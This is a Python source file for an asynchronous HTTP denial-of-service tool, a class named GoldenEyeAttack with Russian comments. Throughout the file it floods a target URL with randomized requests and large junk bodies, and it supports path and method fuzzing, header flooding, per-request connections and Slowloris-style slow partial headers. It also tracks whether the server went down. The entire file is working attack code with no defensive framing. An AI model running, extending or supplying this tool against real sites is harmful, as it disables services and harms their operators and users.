import asyncio
import httpx
import random
import time
from urllib.parse import urlparse
from typing import List

from utils import generate_headers, random_string, parse_data_size
from colorama import Fore, Style


class GoldenEyeAttack:
    def __init__(self, url: str, workers: int, sockets: int, methods: List[str],
                 useragents: List[str], no_ssl_check: bool, debug: bool, proxy: str = None,
                 use_http2: bool = False, slow_rate: float = 0.0, extreme: bool = False,
                 data_size: str = "0", flood: bool = False, path_fuzz: bool = False,
                 header_flood: bool = False, method_fuzz: bool = False, args=None):
        self.url = url
        self.workers = workers
        self.sockets = sockets
        self.methods = [m.strip().upper() for m in methods if m.strip()]
        self.useragents = useragents or []
        self.no_ssl_check = no_ssl_check
        self.debug = debug
        self.proxy = proxy
        self.use_http2 = use_http2
        self.slow_rate = slow_rate
        self.extreme = extreme
        self.data_size = parse_data_size(data_size)
        self.flood = flood
        self.path_fuzz = path_fuzz
        self.header_flood = header_flood
        self.method_fuzz = method_fuzz
        self.args = args

        self.parsed_url = urlparse(url)
        self.host = self.parsed_url.netloc
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"

        self.referers = ['http://google.com/', 'http://bing.com/', f'http://{self.host}/']
        self.paths = ['/', '/news', '/home', '/about', '/contact']
        self.fuzz_methods = ['PROPFIND', 'REPORT', 'MKCOL', 'LOCK', 'UNLOCK', 'TRACE']

        # ❌ УДАЛЁН: self.methods = [m for m in ...] — мешал method_fuzz

        self.sent = 0
        self.failed = 0
        self.start_time = time.time()
        self.lock = asyncio.Lock()

        self.rps_history = []
        self.latency_samples = []
        self.base_latency = 0.0

        self.active_tasks = set()
        self._shutdown_event = asyncio.Event()
        self._slow_writers = []

    async def start(self):
        base_kwargs = {
            "verify": not self.no_ssl_check,
            "timeout": httpx.Timeout(10.0),
            "limits": httpx.Limits(
                max_connections=100 if self.extreme else None,
                max_keepalive_connections=100
            ),
        }
        # Убираем http2 при extreme
        if self.use_http2 and not self.extreme:
            base_kwargs["http2"] = True
        if self.proxy:
            base_kwargs["proxies"] = self.proxy

        if self.proxy and self.slow_rate > 0:
            print(f"{Fore.YELLOW}⚠️ Прокси не работает с slow_request{Style.RESET_ALL}")

        tasks = [asyncio.create_task(self.worker(base_kwargs)) for _ in range(self.workers)]
        monitor_task = asyncio.create_task(self.monitor())
        rps_task = asyncio.create_task(self.collect_rps_stats())

        try:
            await asyncio.gather(*tasks, monitor_task, rps_task, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    async def measure_base_latency(self, client):
        try:
            start = time.time()
            await client.get(self.url)
            return (time.time() - start) * 1000
        except:
            return 100.0

    def build_random_url(self):
        path = random.choice(self.paths)
        if self.path_fuzz:
            depth = random.randint(2, 4)  # Не слишком глубоко
            path += "/" + "/".join(random_string(random.randint(5, 12)) for _ in range(depth))
            path += random.choice(['', '.php', '.json', '.js'])
        url = self.base_url + path
        sep = '&' if '?' in url else '?'
        url += sep + f"t={int(time.time() * 1000)}&x={random_string(16)}"
        return url

    def get_random_method(self):
        if self.method_fuzz and random.random() < 0.3:
            return random.choice(self.fuzz_methods)
        return random.choice(self.methods)

    async def worker(self, base_kwargs):
        client = None
        if not self.extreme:
            try:
                client = httpx.AsyncClient(**base_kwargs)
                await client.__aenter__()
            except Exception as e:
                if self.debug:
                    print(f"{Fore.RED}[DEBUG] Не удалось подключиться: {e}{Style.RESET_ALL}")
                return

        try:
            while not self._shutdown_event.is_set():
                method = self.get_random_method()
                url = self.build_random_url()
                headers = generate_headers(
                    self.host,
                    self.useragents,
                    self.referers,
                    use_junk=self.args.junk,
                    use_random_host=self.args.random_host,
                    header_flood=self.args.header_flood
                )

                data = None
                BODY_METHODS = {'POST', 'PUT', 'PATCH', 'PROPFIND', 'REPORT', 'MKCOL', 'LOCK'}
                if method in BODY_METHODS:
                    size = self.data_size if self.data_size > 0 else random.randint(8192, 65536)
                    json_size = max(1, size - 10)
                    if random.random() < 0.5:
                        data = f'{{"data": "{random_string(json_size)}"}}'
                    else:
                        data = 'X' * max(1, size)

                if self.extreme:
                    async with httpx.AsyncClient(**base_kwargs) as client_once:
                        await self.send_request(client_once, method, url, headers, data)
                else:
                    await self.send_request(client, method, url, headers, data)

                if random.random() < self.slow_rate:
                    task = asyncio.create_task(self.slow_request(url))
                    self.active_tasks.add(task)
                    task.add_done_callback(lambda t: self.active_tasks.discard(t))

                if self.flood:
                    await asyncio.sleep(0.001)
                else:
                    await asyncio.sleep(random.uniform(0.01, 0.1))

                if self._shutdown_event.is_set():
                    break

        finally:
            if client:
                try:
                    await asyncio.wait_for(client.aclose(), timeout=1.0)
                except asyncio.TimeoutError:
                    pass

    async def send_request(self, client, method, url, headers, data):
        try:
            start = time.time()
            await client.request(method, url, headers=headers, content=data, follow_redirects=False)
            latency_ms = (time.time() - start) * 1000
            async with self.lock:
                self.sent += 1
                self.latency_samples.append(latency_ms)
        except Exception as e:
            async with self.lock:
                self.failed += 1
            if self.debug:
                print(f"{Fore.RED}[DEBUG] {e}{Style.RESET_ALL}")

    async def slow_request(self, url: str):
        if self._shutdown_event.is_set():
            return
        writer = None
        try:
            target = self.parsed_url.hostname
            port = 443 if self.parsed_url.scheme == 'https' else 80
            ssl = self.parsed_url.scheme == 'https'
            reader, writer = await asyncio.open_connection(target, port, ssl=ssl)
            self._slow_writers.append(writer)

            writer.write(f"GET {url} HTTP/1.1\r\n".encode())
            await writer.drain()
            await asyncio.sleep(0.5)

            headers = generate_headers(
                self.host,
                self.useragents,
                self.referers,
                use_junk=self.args.junk,
                use_random_host=self.args.random_host,  # ✅ Исправлено
                header_flood=self.args.header_flood
            )
            for k, v in headers.items():
                if self._shutdown_event.is_set():
                    break
                writer.write(f"{k}: {v}\r\n".encode())
                try:
                    await asyncio.wait_for(writer.drain(), timeout=1.0)
                except:
                    break
                await asyncio.sleep(0.1 + random.uniform(0.0, 0.3))
            # ❌ УДАЛЁН: await asyncio.sleep(15) — бесполезен

        except Exception:
            pass
        finally:
            if writer is not None:
                try:
                    writer.close()
                    await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
                except Exception:
                    pass
                if writer in self._slow_writers:
                    self._slow_writers.remove(writer)

    async def monitor(self):
        try:
            while not self._shutdown_event.is_set():
                await asyncio.sleep(0.5)
                self.print_stats()
        except asyncio.CancelledError:
            self.print_stats()

    def print_stats(self):
        elapsed = time.time() - self.start_time + 1e-9
        rps = int(self.sent / elapsed)
        print(f"\r{Fore.WHITE}📬 Sent: {self.sent} | ⚠️ Failed: {self.failed} | 🚀 RPS: {rps:4d} | ⏱️ {int(elapsed)}s", end="")

    async def collect_rps_stats(self):
        last = 0
        try:
            while not self._shutdown_event.is_set():
                await asyncio.sleep(1.0)
                now = time.time()
                rps = self.sent - last
                self.rps_history.append({'time': int(now - self.start_time), 'rps': rps})
                last = self.sent
        except asyncio.CancelledError:
            pass

    async def shutdown(self):
        if self._shutdown_event.is_set():
            return
        self._shutdown_event.set()

        for writer in self._slow_writers[:]:
            try:
                writer.close()
            except Exception:
                pass

        for writer in self._slow_writers[:]:
            try:
                await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
            except Exception:
                pass
        self._slow_writers.clear()

        for task in list(self.active_tasks):
            if not task.done():
                task.cancel()
        if self.active_tasks:
            await asyncio.wait(self.active_tasks, timeout=1.0)
        self.active_tasks.clear()

        await asyncio.sleep(0.1)

    def get_avg_latency_increase(self) -> float:
        if not self.latency_samples or self.base_latency <= 0:
            return 0.0
        avg = sum(self.latency_samples) / len(self.latency_samples)
        increase = ((avg - self.base_latency) / self.base_latency) * 100
        return max(0.0, increase)

    def was_server_down(self, threshold=0.5) -> bool:
        total = self.sent + self.failed
        return self.failed / total > threshold if total > 0 else False
